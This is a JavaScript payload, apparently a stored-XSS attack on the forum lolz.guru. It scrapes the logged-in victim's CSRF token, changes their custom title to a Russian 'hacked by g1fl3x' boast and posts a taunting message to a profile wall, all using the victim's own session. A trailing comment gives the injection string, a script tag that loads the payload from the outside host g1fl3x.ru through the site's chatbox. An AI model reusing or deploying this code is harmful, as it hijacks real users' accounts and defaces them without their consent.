// consts
const TITLE = "Взломан g1fl3x'ом retaker'ом и САНЕЙБРИТВОЙ";
const POST_TEXT = "<p>Крутой хакер, меня зломал, а я даже не понял как<br>[IMG]https://i.pinimg.com/originals/33/5f/6d/335f6d0c74c29626008bae58feb98808.gif[/IMG]</p>";

async function f() {
	
	// get token
	let response = await fetch("https://lolz.guru/1");
	let text = await response.text();
	let token = text.split("logout/?_xfToken=")[1].split("\"")[0];

	// change title
	fetch("https://lolz.guru/account/personal-details-save", {
		"headers": {
    			"accept": "application/json, text/javascript, */*; q=0.01",
    			"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"",
 			"sec-ch-ua-mobile": "?0",
  			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "cors",
  			"sec-fetch-site": "same-origin",
  			"x-ajax-referer": "https://lolz.guru/account/personal-details",
   			"x-requested-with": "XMLHttpRequest"
		},
		"referrer": "https://lolz.guru/account/personal-details",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": `custom_title=${TITLE}&save=1&_xfNoRedirect=1&_xfToken=${token}&_xfResponseType=json`,
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
	});

	// create profile post
	fetch("https://lolz.guru/members/3329831/post", {
		"headers": {
			"accept": "application/json, text/javascript, */*; q=0.01",
			"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"",
			"sec-ch-ua-mobile": "?0",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"x-ajax-referer": "https://lolz.guru/members/1/",
			"x-requested-with": "XMLHttpRequest"
		},
		"referrer": "https://lolz.guru/members/1/",
		"referrerPolicy": "strict-origin-when-cross-origin",
		"body": `message_html=${POST_TEXT}&_xfNoRedirect=1&_xfToken=${token}&_xfResponseType=json`,
		"method": "POST",
		"mode": "cors",
		"credentials": "include"
	});
	return 0;
}
f();

/*
блин там додик какой та в чате срет
https://lolz.guru/chatbox/history

<script/src="https://g1fl3x.ru/1.js"></script>
*/
